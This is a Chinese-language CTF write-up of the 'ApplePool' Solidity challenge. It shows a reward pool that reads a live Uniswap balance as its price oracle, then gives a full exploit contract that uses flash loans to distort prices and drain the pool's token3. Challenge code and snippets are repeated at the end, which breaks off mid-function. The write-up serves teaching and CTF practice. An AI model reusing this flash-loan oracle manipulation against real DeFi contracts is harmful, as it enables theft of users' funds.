# 操纵预言机(ApplePool WP)

> 原文: https://www.ctfiot.com/107182.html
> ID: 107182

引言

智能合约所运行在的虚拟机是一个封闭的环境，智能合约无法自发地获取外界信息，必须通过EOA(外部账户)调用合约中的函数来传入信息或改变状态。

在去中心化金融(DeFi)中，通常需要获取各种token的价格，在不引入链下的价格提供者的情况下，可以使用链上的预言机服务。有的链上的对换服务会提供这个功能，当合约进行获取价格请求后，会给出一个价格。

链上预言机中提供的价格通常和合约中的代币数量、时间等参数有关。通过操纵预言机可以来欺骗智能合约来做出错误的决定。

ApplePool

pragma solidity 0.5.16;

contract check {
 using safemath for uint256;
 AppleToken public token0 = new AppleToken(10000 * 10 ** 18);
 AppleToken public token1 = new AppleToken(20000 * 10 ** 18);
 AppleToken public token2 = new AppleToken(20000 * 10 ** 18);
 AppleToken public token3 = new AppleToken(10000 * 10 ** 18);
 UniswapV2Factory public factory = new UniswapV2Factory(address(this));
 AppleRewardPool public appleRewardPool;
 address public pair1;
 address public pair2;
 uint256 public starttime = block.timestamp;
 uint256 public endtime = block.timestamp + 90 days;
 constructor() public {
 pair1 = factory.createPair(address(token0),address(token1));
 token0.transfer(pair1,10000 * 10 ** 18);
 token1.transfer(pair1,10000 * 10 ** 18);
 IUniswapV2Pair(pair1).mint(address(this));
 pair2 = factory.createPair(address(token1),address(token2));
 token1.transfer(pair2,10000 * 10 ** 18);
 token2.transfer(pair2,10000 * 10 ** 18);
 IUniswapV2Pair(pair2).mint(address(this));
 appleRewardPool = new AppleRewardPool(IERCLike(address(token2)),IERCLike(address(token3)),address(pair1),address(pair2));
 token2.transfer(address(appleRewardPool),10000 * 10 ** 18);
 token3.transfer(address(appleRewardPool),10000 * 10 ** 18);
 appleRewardPool.addPool(IERCLike(address(token1)),starttime, endtime,0,false);
 appleRewardPool.addPool(IERCLike(address(token2)),starttime, endtime,0,false);
 }

 function isSolved() public view returns(bool){

 if(token3.balanceOf(address(appleRewardPool)) == 0){
 return true;
 }
 return false;
 }
}

contract AppleRewardPool is Ownable {
 using safemath for uint256;

 struct UserInfo {
 uint256 amount;
 uint256 depositerewarded;
 uint256 ApplerewardDebt;
 uint256 Applepending;
 }

 struct PoolInfo {
 IERCLike token;
 uint256 starttime;
 uint256 endtime;
 uint256 ApplePertime;
 uint256 lastRewardtime;
 uint256 accApplePerShare;
 uint256 totalStake;
 }

 IERCLike public token2;
 IERCLike public token3;
 PoolInfo[] public poolinfo;
 address public pair1;
 address public pair2;

 mapping (uint256 => mapping (address => UserInfo)) public users;

 event Deposit(address indexed user, uint256 _pid, uint256 amount);
 event Withdraw(address indexed user, uint256 _pid, uint256 amount);
 event ReclaimStakingReward(address user, uint256 amount);
 event Set(uint256 pid, uint256 allocPoint, bool withUpdate);

 constructor(IERCLike _token2, IERCLike _token3, address _pair1, address _pair2) public {
 token2 = _token2;
 token3 = _token3;
 pair1 = _pair1;
 pair2 = _pair2;
 }

 modifier validatePool(uint256 _pid) {
 require(_pid < poolinfo.length, " pool exists?");
 _;
 }

 function getpool() view public returns(PoolInfo[] memory){
 return poolinfo;
 }

 function setApplePertime(uint256 _pid, uint256 _ApplePertime) public onlyOwner validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 updatePool(_pid);
 _ApplePertime = _ApplePertime.mul(1e18).div(86400);
 pool.ApplePertime = _ApplePertime;
 }

 function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 _ApplePertime, bool _withUpdate) public onlyOwner {
 if (_withUpdate) {
 massUpdatePools();
 }
 _ApplePertime = _ApplePertime.mul(1e18).div(86400);
 uint256 lastRewardtime = block.timestamp > _starttime ? block.timestamp : _starttime;
 poolinfo.push(PoolInfo({
 token: _token,
 starttime: _starttime,
 endtime: _endtime,
 ApplePertime: _ApplePertime,
 lastRewardtime: lastRewardtime,
 accApplePerShare: 0,
 totalStake: 0
 }));
 }

 function getMultiplier(PoolInfo storage pool) internal view returns (uint256) {
 uint256 from = pool.lastRewardtime;
 uint256 to = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;
 if (from >= to) {
 return 0;
 }
 return to.sub(from);

 }

 function massUpdatePools() public {
 uint256 length = poolinfo.length;
 for (uint256 pid = 0; pid < length; pid++) {
 updatePool(pid);
 }
 }

 function updatePool(uint256 _pid) public validatePool(_pid) {

 PoolInfo storage pool = poolinfo[_pid];
 if (block.timestamp <= pool.lastRewardtime || pool.lastRewardtime > pool.endtime) {
 return;
 }

 uint256 totalStake = pool.totalStake;
 if (totalStake == 0) {
 pool.lastRewardtime = block.timestamp <= pool.endtime ? block.timestamp : pool.endtime;
 return;
 }

 uint256 multiplier = getMultiplier(pool);
 uint256 AppleReward = multiplier.mul(pool.ApplePertime);
 pool.accApplePerShare = pool.accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));
 pool.lastRewardtime = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;
 }

 function pendingApple(uint256 _pid, address _user) public view validatePool(_pid) returns (uint256) {
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][_user];
 uint256 accApplePerShare = pool.accApplePerShare;

 uint256 totalStake = pool.totalStake;
 if (block.timestamp > pool.lastRewardtime && totalStake > 0) {
 uint256 multiplier = getMultiplier(pool);
 uint256 AppleReward = multiplier.mul(pool.ApplePertime);
 accApplePerShare = accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));

 }
 return user.Applepending.add(user.amount.mul(accApplePerShare).div(1e18)).sub(user.ApplerewardDebt);
 }

 function rate() public view returns(uint256) {
 uint256 _price;
 address _token0 = UniswapV2pair(pair1).token0();
 address _token1 = UniswapV2pair(pair1).token1();
 uint256 amount0 = IERCLike(_token0).balanceOf(pair1);
 uint256 amount1 = IERCLike(_token1).balanceOf(pair1);
 _price = amount0.mul(1e18).div(amount1);
 return _price;
 }
 function rate1() public view returns(uint256) {
 uint256 _price;
 (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
 _price = _amount1.div(_amount0).div(2).mul(1e18);
 return _price;
 }

 function deposit(uint256 _pid, uint256 _amount) public validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];

 updatePool(_pid);
 if (user.amount > 0) {
 uint256 Applepending = user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt);
 user.Applepending = user.Applepending.add(Applepending);
 }
 if (_pid == 0){
 uint256 token2_amount = _amount.mul(rate()).div(1e18);
 IERCLike(token2).transfer(msg.sender, token2_amount);
 }
 if (_pid == 1){
 uint256 token3_amount = _amount.mul(rate1()).div(1e18);
 IERCLike(token3).transfer(msg.sender, token3_amount);
 }
 pool.token.transferFrom(_msgSender(), address(this), _amount);
 pool.totalStake = pool.totalStake.add(_amount);
 user.amount = user.amount.add(_amount);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit Deposit(msg.sender, _pid, _amount);
 }

 function withdraw(uint256 _pid, uint256 _amount) public validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];
 require(user.amount >= _amount, "withdraw: not good");
 updatePool(_pid);
 uint256 Applepending = user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt);
 user.Applepending = user.Applepending.add(Applepending);
 user.amount = user.amount.sub(_amount);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 pool.totalStake = pool.totalStake.sub(_amount);
 pool.token.transfer(msg.sender, _amount);
 emit Withdraw(msg.sender, _pid, _amount);
 }

 function reclaimAppleStakingReward(uint256 _pid) public validatePool(_pid) {
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];
 updatePool(_pid);
 uint256 Applepending = user.Applepending.add(user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt));
 if (Applepending > 0) {
 safeAppleTransfer(msg.sender, Applepending);
 }
 user.Applepending = 0;
 user.depositerewarded = user.depositerewarded.add(Applepending);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit ReclaimStakingReward(msg.sender, Applepending);
 }

 function safeAppleTransfer(address _to, uint256 _amount) internal {
 uint256 AppleBalance = token3.balanceOf(address(this));
 require(AppleBalance >= _amount, "no enough token");
 token3.transfer(_to, _amount);
 }

}

先看check合约：

首先创建了四种ERC-20代币：token0 token1 token2 token3，接着创建了一个UniswapV2的工厂合约，使用工厂合约创建了token0和token1的交易对，再向这个交易对中加入各10000 ether的流动性。再创建了token1和token2的交易对，再向其中各添加了10000 ether的流动性。再创建了受害者合约appleRewardPool，并向这个合约传入10000 ether的token2和token3，再向合约中添加两个池子。获取flag的条件是将受害者合约的token3掏空。

查看appleRewardPool合约，看里面是否有能取出token3的相关逻辑，找到这个函数：

function reclaimAppleStakingReward(uint256 _pid) public validatePool(_pid) {
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];
 updatePool(_pid);
 uint256 Applepending = user.Applepending.add(user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt));
 if (Applepending > 0) {
 safeAppleTransfer(msg.sender, Applepending);
 }
 user.Applepending = 0;
 user.depositerewarded = user.depositerewarded.add(Applepending);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit ReclaimStakingReward(msg.sender, Applepending);
 }

 function safeAppleTransfer(address _to, uint256 _amount) internal {
 uint256 AppleBalance = token3.balanceOf(address(this));
 require(AppleBalance >= _amount, "no enough token");
 token3.transfer(_to, _amount);
 }

在这个函数中会获取Applepending这个值，并使用safeAppleTransfer函数将Applepending值的token3转给调用者。再次查看合约，看是否有方法能将Applepending增加到10000 ether：

uint256 multiplier = getMultiplier(pool);
 uint256 AppleReward = multiplier.mul(pool.ApplePertime);
 pool.accApplePerShare = pool.accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));
 pool.lastRewardtime = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;


function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 _ApplePertime, bool _withUpdate) public onlyOwner {
 if (_withUpdate) {
 massUpdatePools();
 }
 _ApplePertime = _ApplePertime.mul(1e18).div(86400);
 uint256 lastRewardtime = block.timestamp > _starttime ? block.timestamp : _starttime;
 poolinfo.push(PoolInfo({
 token: _token,
 starttime: _starttime,
 endtime: _endtime,
 ApplePertime: _ApplePertime,
 lastRewardtime: lastRewardtime,
 accApplePerShare: 0,
 totalStake: 0
 }));
 }

再经过查找之后发现Applepending与ApplePertime这个值有关，而且要获取Applepending，必须要乘ApplePertime。但是在check合约调用addPool添加池子的时候将这个值设置为0:

appleRewardPool.addPool(IERCLike(address(token1)),starttime, endtime,0,false);
appleRewardPool.addPool(IERCLike(address(token2)),starttime, endtime,0,false);

所以操纵Applepending，再使用reclaimAppleStakingReward来解体的思路行不通。再查找是否有办法能取出token3：

function deposit(uint256 _pid, uint256 _amount) public validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];

 updatePool(_pid);
 if (user.amount > 0) {
 uint256 Applepending = user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt);
 user.Applepending = user.Applepending.add(Applepending);
 }
 if (_pid == 0){
 uint256 token2_amount = _amount.mul(rate()).div(1e18);
 IERCLike(token2).transfer(msg.sender, token2_amount);
 }
 if (_pid == 1){
 uint256 token3_amount = _amount.mul(rate1()).div(1e18);
 IERCLike(token3).transfer(msg.sender, token3_amount);
 }
 pool.token.transferFrom(_msgSender(), address(this), _amount);
 pool.totalStake = pool.totalStake.add(_amount);
 user.amount = user.amount.add(_amount);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit Deposit(msg.sender, _pid, _amount);
 }

在deposit函数中，如果调用时将_pid设置为1，函数会调用rate1()计算一个价格，使用这个价格乘以 _amount，就可以向调用者转出相应数量的token3，同时需要调用者向合约转 _amount数量的token2。

现在的问题是我们没有token2，甚至连题目给的四种token都没有。但题目给了两个UniswapV2交易对，交易对的swap函数提供了闪电贷功能，我们能获取交易对中的所有资金，前提是我们必须能还上。

这里还注意到deposit函数在发送token2和token3时使用了rate()和rate2()函数来计算价格：

function rate() public view returns(uint256) {
 uint256 _price;
 address _token0 = UniswapV2pair(pair1).token0();
 address _token1 = UniswapV2pair(pair1).token1();
 uint256 amount0 = IERCLike(_token0).balanceOf(pair1);
 uint256 amount1 = IERCLike(_token1).balanceOf(pair1);
 _price = amount0.mul(1e18).div(amount1);
 return _price;
 }
function rate1() public view returns(uint256) {
 uint256 _price;
 (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
 _price = _amount1.div(_amount0).div(2).mul(1e18);
 return _price;
 }

在rate()函数中，计算相对价格使用的是ERC-20 token的balanceOf接口，所以这个相对价格是pair1中的实时价格。如果我们使用闪电贷将pair1中的token1大量借出，就可以将token1和token2的相对价格抬到非常高。

我们可以从pair1中借出10000 * 10 ** 18 – 1wei的token1，这时rate算出的价格应该也就推到了10000 * 10 ** 18 – 1。这时再调用deposit函数，_pid为0， _amount 为1：

if (_pid == 0){
 uint256 token2_amount = _amount.mul(rate()).div(1e18);
 IERCLike(token2).transfer(msg.sender, token2_amount);
}

这时经过rate()计算，合约会给我们发送10000 * 10 ** 18 – 1wei的token2，代价仅仅是我们向合约发送1wei的token1，而且再调用withdraw可以将发送合约的1wei token1再取出来。现在我们所用的token1就有10000 * 10 ** 18 – 1wei，和当初借出的一样，并且在题目所给的UniswapV2Pair合约的swap函数中，并没有设置手续费：

{ // scope for reserve{0,1}Adjusted, avoids stack too deep errors
 uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(0));
 uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(0));
 require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
 }

这意味着我们只要把借出数量的token1再还回去就能满足k值并不回退。

到现在我们拥有10000 * 10 ** 18 – 1wei的token2，似乎可以再通过deposit函数取出所有的token3，但这时计算价格使用的函数是rate1：

function rate1() public view returns(uint256) {
 uint256 _price;
 (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
 _price = _amount1.div(_amount0).div(2).mul(1e18);
 return _price;
}

该函数在获取到原价格后又除了2，所以这时我们调用deposit时，只能用10000 * 10 ** 18 – 1wei的token2换出5000 ether的token3，同时该函数获取价格使用的是getReserves()，该接口获取的是swap之前的相对价格，意味着我们不能通过闪电贷来操纵价格。

但我们可以将获取到的所有token2发送到pair2中，同时取出5000 ether的token1。这时候池子中的两种代币相对价格为4，经过rate1()的计算变成2，这时只要5000 ether的token2就可以换出全部的token3。但经过这么一顿折腾，我们手上只有5000 ether的token1，这时该怎么办？

可以再进行一次闪电贷，由于rate1()计算出的价格不受闪电贷影响，所以我们借空pair2合约也不影响价格计算。这时我们从pair2借出5000 ether 的token2，调用deposit，_amoun为5000 ether，换出合约中的全部token3，同时我们手上还有5000 ether的token1，这时将他们发送到pair2合约，现在池子中两种代币数量为 10000 ether和15000 ether，满足K值绰绰有余。

EXP

contract Exp is IUniswapV2Callee{

 check public c;
 AppleRewardPool public pool; // IERCLike
 address public token0;
 address public token1;
 address public token2;
 address public token3;

 address public pair1;
 address public pair2;


 constructor(address _check, address _pool, address _token0, address _token1, address _token2, address _token3, address _pair1, address _pair2) public {
 c = check(_check);
 pool = AppleRewardPool(_pool);
 token0 = _token0;
 token1 = _token1;
 token2 = _token2;
 token3 = _token3;
 pair1 = _pair1;
 pair2 = _pair2;
 IERCLike(token0).approve(address(pool), 100000 ether);
 IERCLike(token1).approve(address(pool), 100000 ether);
 IERCLike(token2).approve(address(pool), 100000 ether);
 IERCLike(token3).approve(address(pool), 100000 ether);

 IERCLike(token1).approve(address(pair1), 100000 ether);

 }

 function flashloan() public {
 IUniswapV2Pair(pair1).swap(0, 10000 * 10 ** 18 - 1 , address(this), new bytes(10));
 }

 function flashloan2() public {
 IUniswapV2Pair(pair2).swap(0, 5000 * 10 ** 18 , address(this), new bytes(5));
 }


 function swap() public {
 IERCLike(token2).transfer(address(pair2), 9999 ether);
 IUniswapV2Pair(pair1).swap(0, 4999 * 10 ** 18 , address(this), new bytes(0));
 }

 function deposit(uint256 _pool, uint256 _amount) public {

 pool.deposit(_pool, _amount);
 }

 function withdraw(uint256 _pool, uint256 _amount) public {

 pool.withdraw(_pool, _amount);
 }

 function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
 if (data.length > 8) {
 require(IERCLike(token1).balanceOf(pair1) == 1, "err flash");

 pool.deposit(0, 1);

 require(IERCLike(token2).balanceOf(address(this)) >= 9999 * 10 ** 18, "err flash1");

 pool.withdraw(0, 1);

 IERCLike(token2).transfer(address(pair2), 10000 * 10 ** 18);
 IUniswapV2Pair(pair2).swap(5000 * 10 ** 18, 0, address(this), new bytes(0)); // got 4999 ether token1
 require(IERCLike(token1).balanceOf(pair2) < 10000 ether, "err flash2");

 require(IERCLike(token1).balanceOf(address(this)) >= 9999 ether, "err flash3");

 IERCLike(token1).transfer(address(pair1), 10000 * 10 ** 18 - 1);
 } else {
 pool.deposit(1, 5000 * 10 ** 18);
 IERCLike(token1).transfer(address(pair2), IERCLike(token1).balanceOf(address(this)));

 }


 }

 function transfer2(address to, uint256 amount) public {
 IERCLike(token2).transfer(to, amount);
 }

 function transfer3(address to, uint256 amount) public {
 IERCLike(token3).transfer(to, amount);
 }
}

部署完Exp合约之后分别调用flashloan和flashloan2，达到获取flag条件

总结

以太坊操纵预言机是一种危险的恶意行为，它可以导致智能合约被操纵并从中获得不当利益。为了预防以太坊操纵预言机，可以采取多种措施，例如使用多个预言机、使用加密技术、限制预言机的访问权限以及对预言机进行审计等。然而，预言机攻击仍然是一个值得关注的问题，因此在开发以太坊智能合约时，开发者应该考虑采取一系列措施来确保智能合约的安全性和可靠性。同时，加强社区的安全意识和合作也是必不可少的。

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
pragma solidity 0.5.16;

contract check {
 using safemath for uint256;
 AppleToken public token0 = new AppleToken(10000 * 10 ** 18);
 AppleToken public token1 = new AppleToken(20000 * 10 ** 18);
 AppleToken public token2 = new AppleToken(20000 * 10 ** 18);
 AppleToken public token3 = new AppleToken(10000 * 10 ** 18);
 UniswapV2Factory public factory = new UniswapV2Factory(address(this));
 AppleRewardPool public appleRewardPool;
 address public pair1;
 address public pair2;
 uint256 public starttime = block.timestamp;
 uint256 public endtime = block.timestamp + 90 days;
 constructor() public {
 pair1 = factory.createPair(address(token0),address(token1));
 token0.transfer(pair1,10000 * 10 ** 18);
 token1.transfer(pair1,10000 * 10 ** 18);
 IUniswapV2Pair(pair1).mint(address(this));
 pair2 = factory.createPair(address(token1),address(token2));
 token1.transfer(pair2,10000 * 10 ** 18);
 token2.transfer(pair2,10000 * 10 ** 18);
 IUniswapV2Pair(pair2).mint(address(this));
 appleRewardPool = new AppleRewardPool(IERCLike(address(token2)),IERCLike(address(token3)),address(pair1),address(pair2));
 token2.transfer(address(appleRewardPool),10000 * 10 ** 18);
 token3.transfer(address(appleRewardPool),10000 * 10 ** 18);
 appleRewardPool.addPool(IERCLike(address(token1)),starttime, endtime,0,false);
 appleRewardPool.addPool(IERCLike(address(token2)),starttime, endtime,0,false);
 }

 function isSolved() public view returns(bool){

 if(token3.balanceOf(address(appleRewardPool)) == 0){
 return true;
 }
 return false;
 }
}

contract AppleRewardPool is Ownable {
 using safemath for uint256;

 struct UserInfo {
 uint256 amount;
 uint256 depositerewarded;
 uint256 ApplerewardDebt;
 uint256 Applepending;
 }

 struct PoolInfo {
 IERCLike token;
 uint256 starttime;
 uint256 endtime;
 uint256 ApplePertime;
 uint256 lastRewardtime;
 uint256 accApplePerShare;
 uint256 totalStake;
 }

 IERCLike public token2;
 IERCLike public token3;
 PoolInfo[] public poolinfo;
 address public pair1;
 address public pair2;

 mapping (uint256 => mapping (address => UserInfo)) public users;

 event Deposit(address indexed user, uint256 _pid, uint256 amount);
 event Withdraw(address indexed user, uint256 _pid, uint256 amount);
 event ReclaimStakingReward(address user, uint256 amount);
 event Set(uint256 pid, uint256 allocPoint, bool withUpdate);

 constructor(IERCLike _token2, IERCLike _token3, address _pair1, address _pair2) public {
 token2 = _token2;
 token3 = _token3;
 pair1 = _pair1;
 pair2 = _pair2;
 }

 modifier validatePool(uint256 _pid) {
 require(_pid < poolinfo.length, " pool exists?");
 _;
 }

 function getpool() view public returns(PoolInfo[] memory){
 return poolinfo;
 }

 function setApplePertime(uint256 _pid, uint256 _ApplePertime) public onlyOwner validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 updatePool(_pid);
 _ApplePertime = _ApplePertime.mul(1e18).div(86400);
 pool.ApplePertime = _ApplePertime;
 }

 function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 _ApplePertime, bool _withUpdate) public onlyOwner {
 if (_withUpdate) {
 massUpdatePools();
 }
 _ApplePertime = _ApplePertime.mul(1e18).div(86400);
 uint256 lastRewardtime = block.timestamp > _starttime ? block.timestamp : _starttime;
 poolinfo.push(PoolInfo({
 token: _token,
 starttime: _starttime,
 endtime: _endtime,
 ApplePertime: _ApplePertime,
 lastRewardtime: lastRewardtime,
 accApplePerShare: 0,
 totalStake: 0
 }));
 }

 function getMultiplier(PoolInfo storage pool) internal view returns (uint256) {
 uint256 from = pool.lastRewardtime;
 uint256 to = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;
 if (from >= to) {
 return 0;
 }
 return to.sub(from);

 }

 function massUpdatePools() public {
 uint256 length = poolinfo.length;
 for (uint256 pid = 0; pid < length; pid++) {
 updatePool(pid);
 }
 }

 function updatePool(uint256 _pid) public validatePool(_pid) {

 PoolInfo storage pool = poolinfo[_pid];
 if (block.timestamp <= pool.lastRewardtime || pool.lastRewardtime > pool.endtime) {
 return;
 }

 uint256 totalStake = pool.totalStake;
 if (totalStake == 0) {
 pool.lastRewardtime = block.timestamp <= pool.endtime ? block.timestamp : pool.endtime;
 return;
 }

 uint256 multiplier = getMultiplier(pool);
 uint256 AppleReward = multiplier.mul(pool.ApplePertime);
 pool.accApplePerShare = pool.accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));
 pool.lastRewardtime = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;
 }

 function pendingApple(uint256 _pid, address _user) public view validatePool(_pid) returns (uint256) {
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][_user];
 uint256 accApplePerShare = pool.accApplePerShare;

 uint256 totalStake = pool.totalStake;
 if (block.timestamp > pool.lastRewardtime && totalStake > 0) {
 uint256 multiplier = getMultiplier(pool);
 uint256 AppleReward = multiplier.mul(pool.ApplePertime);
 accApplePerShare = accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));

 }
 return user.Applepending.add(user.amount.mul(accApplePerShare).div(1e18)).sub(user.ApplerewardDebt);
 }

 function rate() public view returns(uint256) {
 uint256 _price;
 address _token0 = UniswapV2pair(pair1).token0();
 address _token1 = UniswapV2pair(pair1).token1();
 uint256 amount0 = IERCLike(_token0).balanceOf(pair1);
 uint256 amount1 = IERCLike(_token1).balanceOf(pair1);
 _price = amount0.mul(1e18).div(amount1);
 return _price;
 }
 function rate1() public view returns(uint256) {
 uint256 _price;
 (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
 _price = _amount1.div(_amount0).div(2).mul(1e18);
 return _price;
 }

 function deposit(uint256 _pid, uint256 _amount) public validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];

 updatePool(_pid);
 if (user.amount > 0) {
 uint256 Applepending = user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt);
 user.Applepending = user.Applepending.add(Applepending);
 }
 if (_pid == 0){
 uint256 token2_amount = _amount.mul(rate()).div(1e18);
 IERCLike(token2).transfer(msg.sender, token2_amount);
 }
 if (_pid == 1){
 uint256 token3_amount = _amount.mul(rate1()).div(1e18);
 IERCLike(token3).transfer(msg.sender, token3_amount);
 }
 pool.token.transferFrom(_msgSender(), address(this), _amount);
 pool.totalStake = pool.totalStake.add(_amount);
 user.amount = user.amount.add(_amount);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit Deposit(msg.sender, _pid, _amount);
 }

 function withdraw(uint256 _pid, uint256 _amount) public validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];
 require(user.amount >= _amount, "withdraw: not good");
 updatePool(_pid);
 uint256 Applepending = user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt);
 user.Applepending = user.Applepending.add(Applepending);
 user.amount = user.amount.sub(_amount);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 pool.totalStake = pool.totalStake.sub(_amount);
 pool.token.transfer(msg.sender, _amount);
 emit Withdraw(msg.sender, _pid, _amount);
 }

 function reclaimAppleStakingReward(uint256 _pid) public validatePool(_pid) {
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];
 updatePool(_pid);
 uint256 Applepending = user.Applepending.add(user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt));
 if (Applepending > 0) {
 safeAppleTransfer(msg.sender, Applepending);
 }
 user.Applepending = 0;
 user.depositerewarded = user.depositerewarded.add(Applepending);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit ReclaimStakingReward(msg.sender, Applepending);
 }

 function safeAppleTransfer(address _to, uint256 _amount) internal {
 uint256 AppleBalance = token3.balanceOf(address(this));
 require(AppleBalance >= _amount, "no enough token");
 token3.transfer(_to, _amount);
 }

}
function reclaimAppleStakingReward(uint256 _pid) public validatePool(_pid) {
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];
 updatePool(_pid);
 uint256 Applepending = user.Applepending.add(user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt));
 if (Applepending > 0) {
 safeAppleTransfer(msg.sender, Applepending);
 }
 user.Applepending = 0;
 user.depositerewarded = user.depositerewarded.add(Applepending);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit ReclaimStakingReward(msg.sender, Applepending);
 }

 function safeAppleTransfer(address _to, uint256 _amount) internal {
 uint256 AppleBalance = token3.balanceOf(address(this));
 require(AppleBalance >= _amount, "no enough token");
 token3.transfer(_to, _amount);
 }
uint256 multiplier = getMultiplier(pool);
 uint256 AppleReward = multiplier.mul(pool.ApplePertime);
 pool.accApplePerShare = pool.accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));
 pool.lastRewardtime = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;


function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 _ApplePertime, bool _withUpdate) public onlyOwner {
 if (_withUpdate) {
 massUpdatePools();
 }
 _ApplePertime = _ApplePertime.mul(1e18).div(86400);
 uint256 lastRewardtime = block.timestamp > _starttime ? block.timestamp : _starttime;
 poolinfo.push(PoolInfo({
 token: _token,
 starttime: _starttime,
 endtime: _endtime,
 ApplePertime: _ApplePertime,
 lastRewardtime: lastRewardtime,
 accApplePerShare: 0,
 totalStake: 0
 }));
 }
appleRewardPool.addPool(IERCLike(address(token1)),starttime, endtime,0,false);
appleRewardPool.addPool(IERCLike(address(token2)),starttime, endtime,0,false);
function deposit(uint256 _pid, uint256 _amount) public validatePool(_pid){
 PoolInfo storage pool = poolinfo[_pid];
 UserInfo storage user = users[_pid][msg.sender];

 updatePool(_pid);
 if (user.amount > 0) {
 uint256 Applepending = user.amount.mul(pool.accApplePerShare).div(1e18).sub(user.ApplerewardDebt);
 user.Applepending = user.Applepending.add(Applepending);
 }
 if (_pid == 0){
 uint256 token2_amount = _amount.mul(rate()).div(1e18);
 IERCLike(token2).transfer(msg.sender, token2_amount);
 }
 if (_pid == 1){
 uint256 token3_amount = _amount.mul(rate1()).div(1e18);
 IERCLike(token3).transfer(msg.sender, token3_amount);
 }
 pool.token.transferFrom(_msgSender(), address(this), _amount);
 pool.totalStake = pool.totalStake.add(_amount);
 user.amount = user.amount.add(_amount);
 user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
 emit Deposit(msg.sender, _pid, _amount);
 }
function rate() public view returns(uint256) {
 uint256 _price;
 address _token0 = UniswapV2pair(pair1).token0();
 address _token1 = UniswapV2pair(pair1).token1();
 uint256 amount0 = IERCLike(_token0).balanceOf(pair1);
 uint256 amount1 = IERCLike(_token1).balanceOf(pair1);
 _price = amount0.mul(1e18).div(amount1);
 return _price;
 }
function rate1() public view returns(uint256) {
 uint256 _price;
 (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
 _price = _amount1.div(_amount0).div(2).mul(1e18);
 return _price;
 }
if (_pid == 0){
 uint256 token2_amount = _amount.mul(rate()).div(1e18);
 IERCLike(token2).transfer(msg.sender, token2_amount);
}
{ // scope for reserve{0,1}Adjusted, avoids stack too deep errors
 uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(0));
 uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(0));
 require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
 }
function rate1() public view returns(uint256) {
 uint256 _price;
 (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
